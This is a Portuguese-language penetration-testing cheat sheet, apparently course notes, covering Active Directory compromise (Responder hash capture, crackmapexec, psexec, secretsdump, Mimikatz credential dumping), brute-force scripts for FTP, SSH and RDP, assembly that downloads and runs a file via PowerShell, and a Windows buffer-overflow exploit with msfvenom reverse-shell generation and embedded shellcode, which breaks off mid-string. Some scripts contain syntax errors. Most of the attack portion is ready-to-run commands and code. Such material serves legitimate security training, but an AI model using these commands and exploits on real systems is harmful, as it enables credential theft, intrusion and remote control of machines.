    john --format=netntlmv2 arquivohash --wordlist=/caminho/wordlist.txt 

Quebra a senha encontrada

    cp 44648.rb /caminho/do/modulo/metasploit/ 

        Importa exploit no metasploit para usar diretamente no metas (As vezes tem que editar o arquivo). O exploit 43198.py não importa na base devido não ser do padrão do metasploit.



## PENTEST INTERNO DO ZERO AO DOMAIN ADMIN


Escopo é pegar apenas os hosts do orionscorp e fazer os testes de segurança

    nmap -v -Pn -sS -p 445 192.168.1.0/24 -oG smb.txt 

Procura por hosts com compartilhamento ativo em busca do servidor de AD

    crackmapexec smb targets-da-cap-canterior.txt 

Procura pelos hosts encontrados anteriormente para enumerar o serviço smb e saber dos computadores no grupo orionscorp

    nmap -v -Pn -p- 192.168.1.243 

Varre as portas do host do AD para saber dos serviços ativos

    host 192.168.1.241 192.168.1.243 

Para descobrir o nome do host perguntando para o servidor de DNS da orionscorp (segundo IP é o IP que responde à pergunta de DNS, quando passado)

    Maquina Pentester: cat /etc/responder/responder.conf

Em: RespondTo = 192.168.1.243, 192.168.1.241, 192.168.1.253 

    responder -I eth0 -Priv 

Escuta os hosts passados anteriormente e capturar os hashes pela rede - Ao capturar a hash use uma ferramenta para quebrar e obter a senha


Validando os usuários

    crackmapexec smb hosts.txt -d dominio -u user -p 'password' 

Validar usuários encontrados e tentar saber qual tem permissão de execução de comandos Pwn3d!

    python3 /usr/share/doc/python3-impacket/examples/psexec.py dominio/usuario:'senha@192.168.1.253' 

Faz a autenticação usando o psexec podendo também usar o metasploit (PTH Pass The Hash)

`impacket-psexec` informa quais compartilhamento aquele usuário tem permissao de escrita naquele host
`crackmapexec` enumera e compromete smb,ssh,ldap,rdp,ftp,mssql,winrm otimo utilitario 
`net rpc group members "Administrators" -U "user%Senha@123" -I 192.168.1.100` enumera usuário do grupo via RPC

Nota: Com o usuário com permissão de execução de comandos, pode-se acessar o rpcclient e enumerar mais informações do servidor de AD.

- Ambiente WinXP: 

Usando o repair é um cache antigo no caso nos sistemas windows XP...
           Usando o reg save é o que o hashdump usa, ou seja, mais atualizado.
           Resumindo, dar um reg save é a mesma coisa de hashdump (Win10 e XP com adm)

No AD se usa o NTDS.dit

    impacket-secretsdump dominio/usuario:'senha'@192.168.1.253 

Tentar pegar as senhas dos administradores do sistema

    meterpreter: loads kiwi 

Carrega o Kiwi para enumeração de hashes 

    creds_all 

Trazendo os hashes dos usuários | DCC = domain cash credentials

    hashcat -m 2100 hash-tipo-dcc.txt /local-word/list.txt --show Quebra hash da credencial de ADM

.

    crackmapexec 192.168.1.243 -u egabriel -p 'p@ssw0rd' -x 'ipconfig' 

Valida  a senha de adm e envia comando direto para a máquina do AD 

    crackmapexec smb 192.168.1.243 -u user -p 'password' -L 

Lista os módulos do crackmapexec inclusive te permite habilitar o RDP, caso esteja desabilitado

    crackmapexec smb 192.168.1.243 -u user -p 'password' -M rdp --options 

Lista as opções do módulo

    crackmapexec smb 192.168.1.243 -u user -p 'password' -M rdp -o ACTION=enable 

Ativa o modulo

    netsh advfirewall firewall add rule name="rdp" protocol=TCP dir=in localport=3389 action=allow 

Adiciona regra no firewall para habilitar o RDP



## BRUTE FORCE


    grep -r "pedro123" * 

Vai buscar em todos os arquivos do diretório a palavra informada

    office2john arquivo.xls 

Prepara o arquivo para quebrar senha no John

    zip2john arquivo.zip 

Prepara o arquivo para quebrar a senha com o john

    ssh2john id_rsa > id_rsa_hash 

Cria o arquivo com a hash para quebrar no John posteriormente

    john --wordlist=wl.txt --rules --stdout > mutacao 

Mutando uma wordlist existente

    /etc/john/john.conf | search wordlist mode rules | ^INI[1-10] $FIN[1-10]  

Personalizar wordlist com dígito no fim e no início.

    cewl site.com -m 7 

Busca palavras dentro do site com 7 chars, um Crawler de palavras

    crunch 10 10 -t palavra^'char-spec'%'digito'@'minus','maius' 
    crunch 8 8 -t senha#%% -l aaaaa#aa | grep -E '2[20,21,22,23,24,25]$'

Cria Gera senha password gerador wordlist com a palavra passada e com dígitos com as flags informadas.


- Key Space Brute Force

.

    crunch 4 4 0123456789 -o pin.txt 

Gera um pin de 4 digitos na wordlist

     chrunch 7 7 -t dev%%%%  > wldev.txt

Gera uma wordlist com a palabra dev seguida de 4 dígitos crescentes PIN

    crunch 4 4 -f charset.lst numeric -o pin.txt 

Gera um padrão usando a lista charset.lst (usr/share/crunch/charset.lst) e informando o padrão, se numérico, se caracteres especiais se alfabeto...

    hydra -v -l rogerio -p admin -m servers.txt smb 

Bruteforce no serviço SMB. FTP, RDP

    hydra -v -L users.txt -p admin 172.17.1.4 ssh -W 10 

Bruteforce em reverse brute force onde o bloqueio por tentativa é apenas no campo senha. E o tempo com de 10s de uma requisição para outra

    hydra -v -l  user -p passwd -M servers.txt -s 2222 

Brute force com password encontrado em todos os servers.


- Script Bruteforce em FTP (usando python2)

.

	#!/usr/bin/python

	import socket,sys,re

	if len(sys.argv) != 3:

	    print ("modo de uso: nome do programa alvo e usuário")

	    sys.exit()

	target = sys.argv[1]

	usuario = sys.argv[2]

	f = open ('wordlist.txt')

	for palavra in f.readlines():

		  print ("realizando ataque FTP: %s:%s" %(usuario, palavra))

		  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		  s.connect((target, 21))

		  s.recv(1024)

		  s.send("USER "+usuario+"\r\n")

		  s.recv(1024)

		  s.send("PASS "+palavra+"\r\n")

		  resposta = s.recv(1024)

		  s.send("QUIT \r\n")

		  if re.search('230', resposta):

			 print ("[+] Senha encontrada ---->",palavra)

			 break


- Script BruteForce em SSH (usando python3)

.

	pip install paramiko

	#!/usr/bin/python

	import paramiko

	ssh = paramiko.SSHClient()

	ssh.load_system_host_keys() #ler os known_hosts da lista

	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) #Adiciona ao know_host faltante

	f = open ('wordlist.txt')

	for palavra in f.readlines():

		senha = palavra.strip()

		try:

		    ssh.connect('192.168.1.5', username='root', password=senha)

		except paramiko.ssh_exception.AuthenticationException: # Tratar quando login errado

		    print ("testando com:", senha)

		else:

		    print ("Senha encontrada ---->", senha)

		    break

				    #stdin, stdout, stderr = ssh.exec_command('ls')

				    #for linha in stdout.readlines():

					    #print linha.strip()

	ssh.close()  

	Script BruteForce RDP em Bash

	    for pass in $(cat lista.txt);

	    do

	    echo "Testando senha: $pass"

	    xfreerdp /u:rgerio /p:$pass /d:gkidman /v:192.168.1.60

	    done

## DEV EXPLOITATION - ASSEMBLY PARA PENTESTERS WINDOWS


Breve tutorial do ambiente: Instala o DEV CPP e Immunity Debugger, copia o mona para dentro de py no Immunity

Pega o Path do nasm e do dev-cpp a bin e coloca nas configurações avançadas do windows onde troca de nome de usuário para aceitar o comando de qualquer lugar e faz os testes do comando nasm pra ver se ta funcionando.

- Cria um arquivo com o Dev CPP

.

	#include <stdio.h>

	int main (){

		printf("Information Security");

	}

	    Roda e compila


	    Programa em ASSEMBLY


	global _main

	section .text

	_main:

	    NOP

	    NOP

	    NOP

	    NOP

	    NOP

	    NOP

	    NOP

	    NOP

	    MOV EAX, 41424344h ;ABCD em hex

	    MOV BX, 4141h

	    MOV CH, 41h

	    MOV DL, 41H

	    XOR EAX, EAX

	    XOR EBX, EBX

	    XOR ECX, ECX

	    XOR EDX, EDX

Salva em assembly.asm

	    nasm -f win32 assembly.asm -o assembly.obj 

		Cria o executável do assembly

	    objdump -d -M intel assembly.obj 

		Faz um dump do código e mostra na tela. (sem o parâmetro -M intel ele traz o código em AT&T)

	    golink /entry _main assembly.obj 

		Linka o arquivo


Abrir o arquivo exe com o Immunity e analisar.

F7  inicia o debugger

New Origin Here Volta para o início do código (Click dir do mouse na linha)

    MOV - Grava no registrador

    JE - Pula se igual

    JNE - Pula se Não igual

    CMP - Compara

    INC - Incrementa

    PUSH - Coloca no top da stack

    POP - Tira do topo da Stack


- Script em C para Sleep do windows

.

	#include <synchapi.h>

	int main(){

	    Sleep(4000);

	}

- Script em assembly Sleep

.

	global _main

	section .text

	_main:

	    xor eax, eax

	    mov eax, 9000

	    push eax

	    mov ebx, 0x5401AB0 ; Endereço descoberto com o outro código

	    call ebx

	    golink /console /entry _main aguardar.obj Kernel32.dll 

		Cria o executável

	    arwin Kernel32.dll 

Sleep Pega o endereço da memória sem precisar analisar o código no immunity


- Script em C para cmd.exe do windows

.

	#include <Windows.h>

	int main(){

	    system("cmd.exe");

	}

- Script em assembly cmd.exe

.

	extern system

	global _main

	section .text

	_main:

	    push 0x00657865

	    push 0x2E646D63

	    push esp

	    pop eax

	    push eax

	    mov ebx, 0x004025F8

	    call ebx

	    golink /console /entry _main cmd-exe-assembly.obj msvcrt.dl 

Linkar o obj gerando o exe


- Código assembly Atividade cmd.exe /c calc.exe

.

	extern system

	global _main

	section .text

	_main:

	    push 0x2E646D63

	    push 0x00657865

	    push 0x20632F20

	    push 0x6578652E

	    push 0x636C6163

	    push esp

	    pop eax

	    push eax

	    mov ebx, 0x74E54FB0

	    call ebx

- Script em C MessageBoxA

.

	#include <windows.h>

	int main(){

		MessageBoxA(0,"Ygor C Developer","From KidManSecurity",1);

	}

- Script Assembly MessageBoxA

.

	extern _MessageBoxA

	global _main

	section .data

	    texto db "www.kidmansecurity.com",0

	    titulo db "keep Learning",0

	section .text

	_main:

	    push 0

	    push titulo

	    push texto

	    push 0

	    call _MessageBoxA

- Script ShellExecute em C

.

	#include <windows.h>

	int main (){

		ShellExecute(0, "open", "cmd", 0, 0, 3);

	}

- Script ShellExecute Assembly 

Usar comando Shell32.dll p/ compilar com golink sem o /console para esconder o shell

	extern _ShellExecuteA

	global _main

	section .data

	    tipo db "open",0

	    cmd db "cmd",0

	    par db "/c mkdir ygor",0

	section .text

	_main:

	    push 0

	    push 0

	    push par

	    push cmd

	    push tipo

	    push 0

	    call _ShellExecuteA
.

	powershell -Command wget https://site.com/donwload/file.exe -Outfile c:/file.exe ; c:file.exe 

Executar comando no código assembly para fazer o download e executar o arquivo baixado.

Exemplo:

- Script para baixar e executar arquivo com Assembly

.

	extern _ShellExecuteA

	global _main

	section .data

	    tipo db "open",0

	    cmd db "cmd",0

	    par db "/c powershell -Command wget 'https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe' -Outfile c:\file.exe ; c:\file.exe ",0

	section .text

	_main:

	    push 0

	    push 0

	    push par

	    push cmd

	    push tipo

	    push 0

	    call _ShellExecuteA
	    

## DEV EXPLOITATION - ASSEMBLY PARA PENTESTERS LINUX


    man syscall 

É basicamente o módulo do sistema responsável por executar os comandos

    unistd_32.h / unistd_64.h 

Referência para os nomes das Syscalls

[Site que contém essas explicações:](syscalls.w3challs.com/?arch=x86 /?arch=x86_64)

    nasm -f alf32 file.asm 

Cria o arquivo.o

    ld -entry _main -m alf_i386 file.o -o file 

Cria o arquivo executável do linux

    nasm -f alf64 file.asm 

Cria o arquivo.o 64b

    ld -entry _main file.o -o file 

Cria o arquivo executável do linux 64bits


- Script Assembly Linux

.

	global _main

	section .data

	    curso: db 'KidMan Security', 0xa ; pula uma linha

	section .text

	_main:

	    mov eax, 4 ;tipo de chamada do print

	    mov ebx, 1 ;faz parte do print (0.1.2 0.saida.erro) tipo de output

	    mov ecx, curso ;executa a variável

	    mov edx, 15 ; tamanho da string

	    int 0x80 

	    mov eax, 1 ; chama o exit

	    mov ebx, 0 ; envia o parâmetro

	    int 0x80 ; executa

.

    gdb -q ./arquivo-exec-comp -tui 

Arquivo para analisar que foi criado anteriormente (GDB = Immunity debugger)


Comandos do GDB e GDB TUI para Debugger linux

    break _main 

Seta a parada para o _main

    run 
    
Roda o programa até o momento informado (_main)

    info registrers ou i r 

Mostra os registradores

    disas 

Mostra o codigo

    set disassembly-flavor intel 

Colocar a sintaxe para intel

    stepi ou si 

Vai para o próximo passo (f7 do win)

    x/s 0x8012a154 

Following dump do endereço para examinar o que tem dentro

    x/16xw "eip" 

Para ver o que está no endereço, semelhante ao following dump

    layout asm 

Mostra o layout do codigo assembly

    layout regs 

Mostra os registradores

    c 

Continue (f7 do breakpoint)

    b* 0x3nd3r3co 

Break point setar

    LEA 

Parâmetro que armazena um espaço na memória

    run < < (python2 -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"') 

Comando para usar no debugger para explorar o programa.

    python -c 'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"' | ./protegido 

Exploit do programa protegido usado na aula de buffer no linux


EDB Debugger

    edb --run program-name 

Abre o debugger de semelhante modo ao Immunity debugger


- Codigo Assembly em x64 

.

	global _main

	section .data

	    curso: db 'KidMan Security',0xa

	section .text

	_main:

	    mov rax, 1

	    mov rdi, 1

	    mov rsi, curso

	    mov rdx, 15

	    syscall



	    mov rax, 60

	    mov rdi, 0

	    syscall

.

    strace ./assembly-x64 

Faz o monitoramento das chamadas de sistema para saber o que de fato o programa executa

    ltrace programa 

Mostra as library usadas pelo programa informado

    ldd programa 

Verifica também as bibliotecas que o programa tá usando/chamando e verifica se é linkado ou não


    STRCPY,SCANF,GETS 

São comandos/códigos vulneráveis ao buffer-overflow


Nota: Usar o STRNCPY e informar o numero de chars que fica seguro ou informar no gets o número de bytes permitidos


## BUFFER OVERFLOW - WINDOWS


	#/usr/bin/python

	import socket

	lista=["A"]

	contador=100

	while len(lista) <= 50:

		lista.append("A"*contador)

		contador = contador + 100

	for dados in lista:

		print "Fuzzing com SEND %s bytes"%len(dados)

		s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		s.connect(("192.168.254.207", 1020))

		banner = s.recv(1024)

		s.send("SEND "+dados"\r\n")

Com esse código acima você descobre até onde a aplicação quebra, depois é descoberto o número exato que ela de fato quebra... como é feito testando com o código abaixo.

	#/usr/bin/python

	import socket

	dados = "A" * 2000 + "B" * 100 + "C" 100

	s.socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	s.connect(("192.168.254.207", 1020))

	banner = s.recv(1024)

	s.send("SEND "+dados"\r\n")

A aplicação quebra em 2200, então a ideia é ir quebrando até chegar #no número exato que a aplicação quebra. 2200 é o número de bytes que a aplicação quebra como testado com o código acima.

    Locate pattern_create

Localiza o pattern_create

    /usr/bin/msf-pattern_create -l 2200 

Descobrir qual o padrão para pesquisar o offset no msf-pattern, deve ser usado com o código em python para enviar e monitorar com o Immunity o EIP

    /usr/bin/msf-pattern_offset -l 2200 -q ED3R3EIP 

Com os dados em EIP informar na query e saber o offset para criar o exploit do buffer overflow


Nota: Para saber se tem espaço para o shellcode é necessário enviar mais letras após o tamanho dos bits encontrado no EIP para saber se cabe pelo menos 300 caracteres que seria o equivalente ao tamanho do shellcode

Gerando badchars com Python

	for num in range(1, 256):

  	print hex(num).replace('0x','\\x'),

	"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


De uma forma automatizada para criar badchars é usando o !MONA bytearray No Immunity debugger 

Para fazer o teste dos badchars é necessário mandar os caracteres gerados e dar um following dump para saber se tem algum char faltando e eliminar do shellcode, geralmente o \x00 \x0a \x0d

- Pesquisando JUMP ESP

Com 2007 bytes e 4 bytes em EIP eu quebro a aplicação

E EIP apontando para ESP eu consigo colocar uma shell e ganhar acesso, mas para encontrar o endereço de retorno é necessário encontrar um endereço que faça um JMP ESP pois ESP sempre muda de endereço...COMO? Procura as dlls carregadas em E com direito na dll (preferência do programa) -> view code CPU -> search-for-command JMP ESP e copia o endereço para usar no Ponteiro. ALTERNATIVA !mona modules Verifica as que tem ASL (proteção) inativa ou !mona find -s "\xff\xe4" -m netserver.dll (dll que tem ASL em false) com o endereço, copia ele e clica na setinha azul do Immunity e vai para o endereço seta um breakpoint, prepara o codigo ex.: 0x625012a0 -> "\xa0\x12\x50\x62" Adiciona os NOPs "\x90" * 32

- Gerando o shellcode
.

    msfvenom -p windows/shell_reverse_tcp lhost=192.168.2.10 lport=443 exitfunc-thread -b "\x00" -f c

Comando para gerar o shellcode já excluindo os badchars (basta colocar o código e refazer o envio já inserindo o shellcode) Depois é só rodar o exploit e pronto.


Exploit criado para netserver

	#!/usr/bin/python

	import socket

	#send = "A" * 1500 + "B" * 1500

	#send = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2D"

	#send = "A" * 2007 + "BBBB" 0x625012a0

	#badchar \x00

	#send = "A" * 2007 + "\xa0\x12\x50\x62" + "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

	shell = ("\xd9\xca\xb8\x8e\x06\xc1\xab\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"

	"\x52\x83\xc7\x04\x31\x47\x13\x03\xc9\x15\x23\x5e\x29\xf1\x21"

	"\xa1\xd1\x02\x46\x2b\x34\x33\x46\x4f\x3d\x64\x76\x1b\x13\x89"

	"\xfd\x49\x87\x1a\x73\x46\xa8\xab\x3e\xb0\x87\x2c\x12\x80\x86"

	"\xae\x69\xd5\x68\x8e\xa1\x28\x69\xd7\xdc\xc1\x3b\x80\xab\x74"

	"\xab\xa5\xe6\x44\x40\xf5\xe7\xcc\xb5\x4e\x09\xfc\x68\xc4\x50"

	"\xde\x8b\x09\xe9\x57\x93\x4e\xd4\x2e\x28\xa4\xa2\xb0\xf8\xf4"

	"\x4b\x1e\xc5\x38\xbe\x5e\x02\xfe\x21\x15\x7a\xfc\xdc\x2e\xb9"

	"\x7e\x3b\xba\x59\xd8\xc8\x1c\x85\xd8\x1d\xfa\x4e\xd6\xea\x88"

	"\x08\xfb\xed\x5d\x23\x07\x65\x60\xe3\x81\x3d\x47\x27\xc9\xe6"

	"\xe6\x7e\xb7\x49\x16\x60\x18\x35\xb2\xeb\xb5\x22\xcf\xb6\xd1"

	"\x87\xe2\x48\x22\x80\x75\x3b\x10\x0f\x2e\xd3\x18\xd8\xe8\x24"

	"\x5e\xf3\x4d\xba\xa1\xfc\xad\x93\x65\xa8\xfd\x8b\x4c\xd1\x95"

	"\x4b\x70\x04\x39\x1b\xde\xf7\xfa\xcb\x9e\xa7\x92\x01\x11\x97"

	"\x83\x2a\xfb\xb0\x2e\xd1\x6c\x7f\x06\xdb\x07\x17\x55\xdb\xd6"

